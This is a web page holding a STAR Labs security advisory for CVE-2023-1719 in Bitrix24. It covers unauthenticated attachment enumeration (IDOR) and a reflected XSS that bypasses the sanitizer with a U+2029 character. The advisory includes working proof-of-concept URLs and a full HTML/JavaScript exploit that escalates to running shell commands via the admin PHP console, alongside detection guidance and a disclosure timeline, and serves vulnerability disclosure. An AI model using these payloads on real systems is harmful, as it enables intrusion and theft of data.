<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>(CVE-2023-1719) Bitrix24 Insecure Global Variable Extraction | STAR Labs</title>
<meta name="keywords" content="">
<meta name="description" content="Summary:    Product Bitrix24     Vendor Bitrix24   Severity High   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1719   CVE Description Global variable extraction in bitrix/modules/main/tools.php in Bitrix24 22.0.300 allows unauthenticated remote attackers to (1) enumerate attachments on the server and (2) execute arbitrary JavaScript code in the victim&rsquo;s browser, and possibly execute arbitrary PHP code on the server if the victim has administrator privilege, via overwriting uninitialised variables.">
<meta name="author" content="Lam Jun Rong &amp; Li Jiantao (@CurseRed)">
<link rel="canonical" href="https://starlabs.sg/advisories/23/23-1719/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2&#43;ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://starlabs.sg/logo-white.png">
<link rel="apple-touch-icon" href="https://starlabs.sg/logo-white.png">
<link rel="mask-icon" href="https://starlabs.sg/logo-white.png">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-0F9M1FRFWQ"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-0F9M1FRFWQ', { 'anonymize_ip': false });
}
</script>
<meta property="og:title" content="(CVE-2023-1719) Bitrix24 Insecure Global Variable Extraction" />
<meta property="og:description" content="Summary:    Product Bitrix24     Vendor Bitrix24   Severity High   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1719   CVE Description Global variable extraction in bitrix/modules/main/tools.php in Bitrix24 22.0.300 allows unauthenticated remote attackers to (1) enumerate attachments on the server and (2) execute arbitrary JavaScript code in the victim&rsquo;s browser, and possibly execute arbitrary PHP code on the server if the victim has administrator privilege, via overwriting uninitialised variables." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://starlabs.sg/advisories/23/23-1719/" /><meta property="og:image" content="https://starlabs.sg/logo-white.png"/><meta property="article:section" content="advisories" />
<meta property="article:published_time" content="2023-11-01T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2023-11-01T00:00:00&#43;00:00" /><meta property="og:site_name" content="STAR Labs" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://starlabs.sg/logo-white.png"/>

<meta name="twitter:title" content="(CVE-2023-1719) Bitrix24 Insecure Global Variable Extraction"/>
<meta name="twitter:description" content="Summary:    Product Bitrix24     Vendor Bitrix24   Severity High   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1719   CVE Description Global variable extraction in bitrix/modules/main/tools.php in Bitrix24 22.0.300 allows unauthenticated remote attackers to (1) enumerate attachments on the server and (2) execute arbitrary JavaScript code in the victim&rsquo;s browser, and possibly execute arbitrary PHP code on the server if the victim has administrator privilege, via overwriting uninitialised variables."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Advisories",
      "item": "https://starlabs.sg/advisories/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "(CVE-2023-1719) Bitrix24 Insecure Global Variable Extraction",
      "item": "https://starlabs.sg/advisories/23/23-1719/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "(CVE-2023-1719) Bitrix24 Insecure Global Variable Extraction",
  "name": "(CVE-2023-1719) Bitrix24 Insecure Global Variable Extraction",
  "description": "Summary:    Product Bitrix24     Vendor Bitrix24   Severity High   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1719   CVE Description Global variable extraction in bitrix/modules/main/tools.php in Bitrix24 22.0.300 allows unauthenticated remote attackers to (1) enumerate attachments on the server and (2) execute arbitrary JavaScript code in the victim\u0026rsquo;s browser, and possibly execute arbitrary PHP code on the server if the victim has administrator privilege, via overwriting uninitialised variables.",
  "keywords": [
    
  ],
  "articleBody": "Summary:    Product Bitrix24     Vendor Bitrix24   Severity High   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1719   CVE Description Global variable extraction in bitrix/modules/main/tools.php in Bitrix24 22.0.300 allows unauthenticated remote attackers to (1) enumerate attachments on the server and (2) execute arbitrary JavaScript code in the victim’s browser, and possibly execute arbitrary PHP code on the server if the victim has administrator privilege, via overwriting uninitialised variables.   CWE Classification(s) CWE-665 Improper Initialization; CWE-454 External Initialization of Trusted Variables or Data Stores   CAPEC Classification(s) CAPEC-77 Manipulating User-Controlled Variables; CAPEC-591 Reflected XSS    CVSS3.1 Scoring System: Base Score: 7.5 (High) Vector String: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\n   Metric Value     Attack Vector (AV) Network   Attack Complexity (AC) Low   Privileges Required (PR) None   User Interaction (UI) None   Scope (S) Unchanged   Confidentiality (C) High   Integrity (I) None   Availability (A) None    1. IDOR of attachments Vulnerability Details: This report presents information on an insecure direct object reference (IDOR) vulnerability caused by global variable extraction in Bitrix24 that allows an unauthenticated attacker to read attachment files.\nIt was discovered that the function FormDecode located at bitrix/modules/main/tools.php is called by bitrix/modules/main/start.php to extract variables from HTTP request into $GLOBALS array.\n// bitrix/modules/main/tools.php  function FormDecode() { $superglobals = array( '_GET'=1, '_SESSION'=1, '_POST'=1, '_COOKIE'=1, '_REQUEST'=1, '_FILES'=1, '_SERVER'=1, 'GLOBALS'=1, '_ENV'=1, 'DBType'=1, 'DBDebug'=1, 'DBDebugToFile'=1, 'DBHost'=1, 'DBName'=1, 'DBLogin'=1, 'DBPassword'=1, 'HTTP_ENV_VARS'=1, 'HTTP_GET_VARS'=1, 'HTTP_POST_VARS'=1, 'HTTP_POST_FILES'=1, 'HTTP_COOKIE_VARS'=1, 'HTTP_SERVER_VARS'=1, ); foreach($superglobals as $gl=$t) { unset($_REQUEST[$gl]); unset($_GET[$gl]); unset($_POST[$gl]); unset($_COOKIE[$gl]); } $register_globals = ini_get_bool(\"register_globals\"); if (!$register_globals) { $toGlobals = array(); foreach($_ENV as $key = $val) if(!isset($superglobals[$key])) $toGlobals[$key] = $val; foreach($_GET as $key = $val) if(!isset($superglobals[$key])) $toGlobals[$key] = $val; foreach($_POST as $key = $val) if(!isset($superglobals[$key])) $toGlobals[$key] = $val; foreach($_COOKIE as $key = $val) if(!isset($superglobals[$key])) $toGlobals[$key] = $val; foreach($_SERVER as $key = $val) if(!isset($superglobals[$key])) $toGlobals[$key] = $val; //$GLOBALS += $toGlobals;  //PHP7 bug  foreach($toGlobals as $key = $val) { if(!isset($GLOBALS[$key])) // [2]  { $GLOBALS[$key] = $val; // [1]  } } } } This function iterates over the key-value pairs in $_GET, $_POST and $_COOKIE, and assign them to $GLOBALS at [1], provided the key is not on the denylist $superglobals and has not been set before ([2]).\nThe caller of this function, start.php, is a vital part of the initialization process for Bitrix24 to handle new requests. Besides extracting global variables from HTTP request, it also initializes database connections, security middlewares and loggers. Thus, an attacker is able to define global variables in querystring, post body and cookies before entering most of the business logics on Bitrix24. In another word, if a variable is not defined before being used, its value could be controlled by attacker. An instance of this case can be found in /pub/im.file.php :\n// /pub/im.file.php  // [1] require_once $_SERVER['DOCUMENT_ROOT'].'/bitrix/modules/main/include/prolog_before.php'; $request = Bitrix\\Main\\Application::getInstance()-getContext()-getRequest(); if ($request-get('FILE_ID') \u0026\u0026 $request-get('SIGN')) // [2] { $diskFileId = (int)$request-get('FILE_ID'); $signer = new \\Bitrix\\Main\\Security\\Sign\\Signer; $sign = htmlspecialcharsbx($request-get('SIGN')); try { $sign = (int)$signer-unsign($sign); } catch (\\Bitrix\\Main\\Security\\Sign\\BadSignatureException $e) { CHTTP::SetStatus('404 Not Found'); } } if ($diskFileId === $sign) // [3] { $file = \\Bitrix\\Disk\\File::getById($diskFileId); if ($file !== null) { $fileId = $file-getFileId(); if ($fileId  0) { CFile::ViewByUser($fileId); // [4]  } } } else { CHTTP::SetStatus('404 Not Found'); } At [1], the server loads prolog_before.php which will eventualy include start.php to modify global variables. At [2], FILE_ID and SIGN are supposed to be read from querystring and assigned to variable $diskFileId and $sign correspondingly. A crypto-safe signing class \\Bitrix\\Main\\Security\\Sign\\Signer is introduced here to ensure authentity.\nLater on, the server checks if the decoded singature is equal to file ID at [3], then it fetches attachment records from database by ID and serves the attachment in reponse at [4].\nHowever, it is discovered that the variables $diskFileId and $sign are only defined when the if conditions at [2] are met. Otherwise, these two variables can be overwritten by setting global variables in FormDecode() function.\nSince the attachment ID stored in database is a self-incrementing integer, it is possible for an unauthenticated attacker to enumerate IDs starting from 1 and retrive all valid attachments.\nProof-of-Concept: The PoC provided below retrives the attachment whose ID is 8 on TARGET_HOST:\nhttp://TARGET_HOST/pub/im.file.php?diskFileId=8\u0026sign=8\nIn trail version of Bitrix24, attachment with ID 8 should be “form.docx” shipped as sample data, as shown in the following image:\nExploit Conditions: This vulnerability can be exploited without any valid credentials.\nDetection Guidance: It is possible to detect the exploitation of this vulnerability by examining traffic logs to detect the presence of the string diskFileId and sign in HTTP request. The presence of these two strings set to the same numeric value (for example, diskFileId=8 and sign=8) indicates possible exploitation of this vulnerability.\nIt is important to note that these two variable can be sent not only in querystring, but also in cookie and post body, separately.\n2. Reflected XSS Vulnerability Details: This report presents information on a cross-site scripting (XSS) vulnerability caused by global variable extraction in Bitrix24. This vulnerability allows an attacker to execute arbitrary JavaScript code on the browser of any victim that visits the affected page. If the victim has administrator permissions, an attacker may leverage the built-in “PHP Command Line” feature to execute arbitrary system commands on the target web server.\nIt was discovered that the function FormDecode located at bitrix/modules/main/tools.php is called by bitrix/modules/main/start.php to extract variables from HTTP request into $GLOBALS array.\n// bitrix/modules/main/tools.php  function FormDecode() { $superglobals = array( '_GET'=1, '_SESSION'=1, '_POST'=1, '_COOKIE'=1, '_REQUEST'=1, '_FILES'=1, '_SERVER'=1, 'GLOBALS'=1, '_ENV'=1, 'DBType'=1, 'DBDebug'=1, 'DBDebugToFile'=1, 'DBHost'=1, 'DBName'=1, 'DBLogin'=1, 'DBPassword'=1, 'HTTP_ENV_VARS'=1, 'HTTP_GET_VARS'=1, 'HTTP_POST_VARS'=1, 'HTTP_POST_FILES'=1, 'HTTP_COOKIE_VARS'=1, 'HTTP_SERVER_VARS'=1, ); foreach($superglobals as $gl=$t) { unset($_REQUEST[$gl]); unset($_GET[$gl]); unset($_POST[$gl]); unset($_COOKIE[$gl]); } $register_globals = ini_get_bool(\"register_globals\"); if (!$register_globals) { $toGlobals = array(); foreach($_ENV as $key = $val) if(!isset($superglobals[$key])) $toGlobals[$key] = $val; foreach($_GET as $key = $val) if(!isset($superglobals[$key])) $toGlobals[$key] = $val; foreach($_POST as $key = $val) if(!isset($superglobals[$key])) $toGlobals[$key] = $val; foreach($_COOKIE as $key = $val) if(!isset($superglobals[$key])) $toGlobals[$key] = $val; foreach($_SERVER as $key = $val) if(!isset($superglobals[$key])) $toGlobals[$key] = $val; //$GLOBALS += $toGlobals;  //PHP7 bug  foreach($toGlobals as $key = $val) { if(!isset($GLOBALS[$key])) // [2]  { $GLOBALS[$key] = $val; // [1]  } } } } This function iterates over the key-value pairs in $_GET, $_POST and $_COOKIE, and assign them to $GLOBALS at [1], provided the key is not on the denylist $superglobals and has not been set before ([2]).\nThe caller of this function, start.php, is a vital part of the initialization process for Bitrix24 to handle new requests. Besides extracting global variables from HTTP request, it also initializes database connections, security middlewares and loggers. Thus, an attacker is able to define global variables in querystring, post body and cookies before entering most of the business logics on Bitrix24. In another word, if a variable is not defined before being used, its value could be controlled by attacker.\nAn instance of this case can be found in bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php :\n// bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php  // [1] require_once($_SERVER[\"DOCUMENT_ROOT\"].\"/bitrix/modules/main/include/prolog_before.php\"); // ...  if ($GLOBALS[\"USER\"]-IsAuthorized()) $log_cnt = CUserCounter::GetValueByUserID($GLOBALS[\"USER\"]-GetID(), $site); // [2]  // ...  $arData = array( array(\"LOG_CNT\" = $log_cnt) // [3] ); echo CUtil::PhpToJSObject($arData); // [4] At [1], the server loads prolog_before.php which will eventualy include start.php to modify global variables. If the current request is an authenticated session, variable $log_cnt will be defined at [2]. Later on, $log_cnt is stored into an array $arData at [3] and passed on to CUtil::PhpToJSObject. The return value will be written to response at [4].\nHowever, if the request does not contain authenticated session cookies, $log_cnt will not be defined at [2]. Thus, it can be overwritten by setting global variables in FormDecode() function.\nThe image below shows log_cnt in the querystring reflected in the response with minor modification, proving that it is possible to inject HTML codes:\nHowever, the built-in Bitrix XSS sanitizer, applied to parameters of every request, complicates exploitation of this vulnerability.\nThe XSS sanitizer uses several regular expressions (regex) to identify and sanitize potentially dangerous input. One of these aims to target HTML event handlers, which could lead to XSS. The regex used can be found in bitrix/modules/security/lib/filter/auditor/xss.php on line 173, and a simplified version is shown below:\n/(on[a-z]*)([a-z]{3}[\\s]*=)/is The regex aims to identify patterns such as onerror= and uses two capturing groups to split the dangerous string into two parts. A space is then added between the two parts, neutralizing the event handler. For example, onerror= would be transformed into oner ror=. Note that the regex allows any amount of whitespace between the event handler name (eg onerror) and the equals sign (=). This is compliant with the HTML specification. On its own, this sanitizer is secure.\nThe CUtil::PhpToJSObject function at [4] calls the CUtil::JSEscape function (shown below) on the value of each key-value pair in the $arData array.\n// bitrix/modules/main/tools.php lines 4349 to 4355  public static function JSEscape($s){ static $aSearch = array(\"\\xe2\\x80\\xa9\", \"\\\\\", \"'\", \"\\\"\", \"\\r\\n\", \"\\r\", \"\\n\", \"\\xe2\\x80\\xa8\", \"*/\", \"); static $aReplace = array(\" \", \"\\\\\\\\\", \"\\\\'\", '\\\\\"', \"\\n\", \"\\n\", \"\\\\n\", \"\\\\n\", \"*\\\\/\", \"\\\\/\"); $val = str_replace($aSearch, $aReplace, $s); return $val; } This function performs a simple string replacement on the input string $s to ensure that it does not contain any characters that may break out of a JavaScript string, such as \", ' or \\.\nNotably, this function replaces the byte string \\xe2\\x80\\xa9 (U+2029 Unicode Paragraph Separator) with a regular space (U+0020 Space).\nThis is a significant transformation as the Bitrix XSS sanitizer does not regard the byte string \\xe2\\x80\\xa9 as whitespace. Therefore, the string onerror\\xe2\\x80\\xa9= would not be sanitized. However, CUtil::JSEscape would transform the string into onerror =, which is a valid HTML onerror event handler.\nTherefore, a malicious attacker may craft a log_cnt parameter on get_message_2.php. As onerror\\xe2\\x80\\xa9= does not match the regex for an event handler, the built-in XSS sanitizer does not sanitize this string. When printing $arData in the response, CUtil::JSEscape replaces \\xe2\\x80\\xa9 with  , resulting in  :\nProof-of-Concept: The PoC provided below will execute alert(document.cookie) when visited by unauthenticated users on TARGET_HOST:\nhttp://TARGET_HOST/bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php?log_cnt=%3Cimg%20onerror%E2%80%A9=alert(document.cookie)%20src=1%3E\nIt was discovered that authenticated users can also be targeted by this vulnerability. An attacker can craft a webpage that loads the reflected XSS in an iframe. Since the “SameSite” attribute of cookies are defaulted to “Lax”, modern browsers will not send session cookies to webserver when the webpage is loaded inside an iframe, on a cross-origin webpage. In this case, the server will treat the iframed request unauthenticated and return the malicious XSS payload. With a reference to authenticated window (for example, top.opener), malicious JavaScript code can be executed as an authenticated user.\nThe following PoC.html demonsetrates such attack (demo.mkv). It requires the victim to click on the button to launch attack. If the victim has logged in to Bitrix24 as admin, this PoC will execute shell command id on the webserver and show the command output in an alert popup.\nbody script let q = new URLSearchParams(location.search), r = false, reload = _= location.search = q.toString(); let step = q.get('step') || (q.set('step', '1'), r = true); let target = q.get('target') || (q.set('target', 'http://10.0.20.40'), r = true); if(r) reload(); if (step === '1') { let btn = document.createElement('button'); btn.innerText = 'run proof-of-concept'; document.body.appendChild(btn); btn.addEventListener('click', _ = { q.set('step', 2); let u = new URL(location); u.search = '?' + q.toString(); window.open(u.toString()); location.href = target; }) } else if (step === '2') { let f = document.createElement('iframe'); let ub64payload = encodeURIComponent('`' + btoa('(' + payload.toString() + ')()') + '`'); f.src = `${target}/bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php?log_cnt=%3Cimg%20src=x%20onerror%e2%80%a9=eval(atob(${ub64payload}))%3E`; document.body.appendChild(f); } else { q.set('step', '1'); reload(); } function payload() { let h = setInterval(async _ = { try { with(top.opener){ let sessid = document.body.innerHTML.match(/sessid=[a-f0-9]{32}/)[0]; alert(await (await fetch(\"/bitrix/admin/php_command_line.php?lang=en\u0026\"+sessid, { method:\"POST\", headers:{ 'Content-Type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ query: `system('id');`, ajax: \"y\", result_as_text:\"Y\" }) })).text()) } clearInterval(h) } catch (e) { } }, 500) } script body Exploit Conditions: An attacker does not require any permissions to carry out this attack. However, the victim needs to visit a specially crafted URL supplied by the attacker.\nDetection Guidance: It is possible to detect the exploitation of this vulnerability by checking the server’s access logs for all requests made to /bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php with parameter log_cnt. The presence of such request strongly indicates exploitation of this vulnerability.\nCredits Lam Jun Rong \u0026 Li Jiantao of of STAR Labs SG Pte. Ltd. (@starlabs_sg)\nTimeline  2023-03-17 Initial Vendor Contact via https://www.bitrix24.com/report/ 2023-03-18 No reply from vendor, tried using the form again 2023-03-21 Email to info@bitrix.com 2023-03-21 Email to info@1c-bitrix.ru 2023-03-24 Got reply from info@1c-bitrix.ru, they asked us to email to info@bitrix.com or use the form at https://www.bitrix24.com/report/ with regards to the bug reports 2023-03-29 Emailed to [redacted], [redacted] \u0026 [redacted]. Team member found the 3 email addresses via an [USA bug bounty platform] 2023-03-30 [redacted] replied to us 2023-03-31 [redacted] wanted us to report the bugs via that [USA bug bounty platform] 2023-03-31 Emailed back to [redacted] that we are unable to do so because it’s a private program in that [USA bug bounty platform] 2023-03-31 [redacted] emailed back with the invite 2023-03-31 Submitted the reports via that [USA bug bounty platform] 2023-03-31 Informed [redacted] again that we are unable to report all the bugs due to [blah blah blah Requirements] 2023-04-03 [redacted] replied that they had remove the [blah blah blah Requirements] limitations for us 2023-04-04 We submitted the final 2 reports 2023-06-21 [redacted] emailed us “Generally, we prefer not to publish CVE, because our clients tend to postpone or skip even critical updates, and hackers definitely will be using this information for attacking our clients. It have happened several times in the past, with huge consequences for our company and for our clients. To tell the truth, I would like to set award on [USA bug bounty platform] instead of CVE publishing. Please let me know what do you think about that.” 2023-06-23 Emailed back to Bitrix that we prefer to publish the CVE and do not want the reward. We are also willing to delay the publication at a mutually agreed date. 2023-09-22 [redacted] finally replied asking us if we are agreeable to publish the CVE in November 2023 2023-09-22 Emailed back that we are agreeable to delay the publication to 1st November 2023 2023-09-22 [redacted] accepted the date 2023-11-01 Public Release  ",
  "wordCount" : "2330",
  "inLanguage": "en",
  "datePublished": "2023-11-01T00:00:00Z",
  "dateModified": "2023-11-01T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Lam Jun Rong \u0026 Li Jiantao (@CurseRed)"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://starlabs.sg/advisories/23/23-1719/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "STAR Labs",
    "logo": {
      "@type": "ImageObject",
      "url": "https://starlabs.sg/logo-white.png"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://starlabs.sg/" accesskey="h" title="  (Alt + H)">
                <img src="https://starlabs.sg/logo-white.png" alt="logo" aria-label="logo"
                    height="35"> </a>
            <span class="logo-switches">
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://starlabs.sg/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/advisories/" title="Advisories">
                    <span>Advisories</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/blog/" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/achievements/" title="Achievements">
                    <span>Achievements</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/publications/" title="Publications">
                    <span>Publications</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://starlabs.sg/">Home</a>&nbsp;»&nbsp;<a href="https://starlabs.sg/advisories/">Advisories</a></div>
    <h1 class="post-title">
      (CVE-2023-1719) Bitrix24 Insecure Global Variable Extraction
    </h1>
    <div class="post-meta"><span title='2023-11-01 00:00:00 +0000 UTC'>November 1, 2023</span>&nbsp;·&nbsp;11 min&nbsp;·&nbsp;Lam Jun Rong &amp; Li Jiantao (@CurseRed)

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#summary" aria-label="Summary:">Summary:</a></li>
                <li>
                    <a href="#cvss31-scoring-system" aria-label="CVSS3.1 Scoring System:">CVSS3.1 Scoring System:</a></li>
                <li>
                    <a href="#1-idor-of-attachments" aria-label="1. IDOR of attachments">1. IDOR of attachments</a><ul>
                        
                <li>
                    <a href="#vulnerability-details" aria-label="Vulnerability Details:">Vulnerability Details:</a></li>
                <li>
                    <a href="#proof-of-concept" aria-label="Proof-of-Concept:">Proof-of-Concept:</a></li>
                <li>
                    <a href="#exploit-conditions" aria-label="Exploit Conditions:">Exploit Conditions:</a></li>
                <li>
                    <a href="#detection-guidance" aria-label="Detection Guidance:">Detection Guidance:</a></li></ul>
                </li>
                <li>
                    <a href="#2-reflected-xss" aria-label="2. Reflected XSS">2. Reflected XSS</a><ul>
                        
                <li>
                    <a href="#vulnerability-details-1" aria-label="Vulnerability Details:">Vulnerability Details:</a></li>
                <li>
                    <a href="#proof-of-concept-1" aria-label="Proof-of-Concept:">Proof-of-Concept:</a></li>
                <li>
                    <a href="#exploit-conditions-1" aria-label="Exploit Conditions:">Exploit Conditions:</a></li>
                <li>
                    <a href="#detection-guidance-1" aria-label="Detection Guidance:">Detection Guidance:</a></li></ul>
                </li>
                <li>
                    <a href="#credits" aria-label="Credits">Credits</a></li>
                <li>
                    <a href="#timeline" aria-label="Timeline">Timeline</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="summary">Summary:<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
<table>
<thead>
<tr>
<th><strong>Product</strong></th>
<th>Bitrix24</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Vendor</strong></td>
<td>Bitrix24</td>
</tr>
<tr>
<td><strong>Severity</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Affected Versions</strong></td>
<td>Bitrix24 22.0.300 (latest version as of writing)</td>
</tr>
<tr>
<td><strong>Tested Versions</strong></td>
<td>Bitrix24 22.0.300 (latest version as of writing)</td>
</tr>
<tr>
<td><strong>CVE Identifier</strong></td>
<td>CVE-2023-1719</td>
</tr>
<tr>
<td><strong>CVE Description</strong></td>
<td>Global variable extraction in bitrix/modules/main/tools.php in Bitrix24 22.0.300 allows unauthenticated remote attackers to (1) enumerate attachments on the server and (2) execute arbitrary JavaScript code in the victim&rsquo;s browser, and possibly execute arbitrary PHP code on the server if the victim has administrator privilege, via overwriting uninitialised variables.</td>
</tr>
<tr>
<td><strong>CWE Classification(s)</strong></td>
<td>CWE-665 Improper Initialization; CWE-454 External Initialization of Trusted Variables or Data Stores</td>
</tr>
<tr>
<td><strong>CAPEC Classification(s)</strong></td>
<td>CAPEC-77 Manipulating User-Controlled Variables; CAPEC-591 Reflected XSS</td>
</tr>
</tbody>
</table>
<h2 id="cvss31-scoring-system">CVSS3.1 Scoring System:<a hidden class="anchor" aria-hidden="true" href="#cvss31-scoring-system">#</a></h2>
<p><strong>Base Score:</strong> 7.5 (High)
<strong>Vector String:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code></p>
<table>
<thead>
<tr>
<th><strong>Metric</strong></th>
<th><strong>Value</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Attack Vector (AV)</strong></td>
<td>Network</td>
</tr>
<tr>
<td><strong>Attack Complexity (AC)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>Privileges Required (PR)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>User Interaction (UI)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>Scope (S)</strong></td>
<td>Unchanged</td>
</tr>
<tr>
<td><strong>Confidentiality (C)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Integrity (I)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>Availability (A)</strong></td>
<td>None</td>
</tr>
</tbody>
</table>
<h2 id="1-idor-of-attachments">1. IDOR of attachments<a hidden class="anchor" aria-hidden="true" href="#1-idor-of-attachments">#</a></h2>
<h3 id="vulnerability-details">Vulnerability Details:<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details">#</a></h3>
<p>This report presents information on an insecure direct object reference (IDOR) vulnerability caused by global variable extraction in Bitrix24 that allows an unauthenticated attacker to read attachment files.</p>
<p>It was discovered that the function <code>FormDecode</code> located at <code>bitrix/modules/main/tools.php</code> is called by <code>bitrix/modules/main/start.php</code> to extract variables from HTTP request into <code>$GLOBALS</code> array.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// bitrix/modules/main/tools.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">FormDecode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$superglobals</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;_GET&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;_SESSION&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;_POST&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;_COOKIE&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;_REQUEST&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;_FILES&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;_SERVER&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;GLOBALS&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;_ENV&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;DBType&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span>  <span class="s1">&#39;DBDebug&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;DBDebugToFile&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;DBHost&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;DBName&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;DBLogin&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;DBPassword&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span>
